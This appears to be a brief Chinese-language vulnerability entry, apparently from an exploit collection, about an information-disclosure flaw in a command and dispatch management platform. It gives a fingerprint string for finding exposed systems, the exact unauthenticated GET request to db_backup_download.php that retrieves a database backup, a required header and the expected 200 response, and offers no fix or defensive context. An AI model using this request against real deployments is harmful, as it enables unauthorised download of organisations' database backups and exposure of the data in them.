# 指挥调度管理平台db_backup_download存在信息泄露漏洞

- **系统**：指挥调度管理平台　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`body="app/structure/departments.php"`
- **请求**：`GET /app/dbtool/db_backup_download.php?backup_id=1 HTTP/1.1`
- **关键头**：`Sec-Fetch-User: ?1`
- **预期**：200　|　—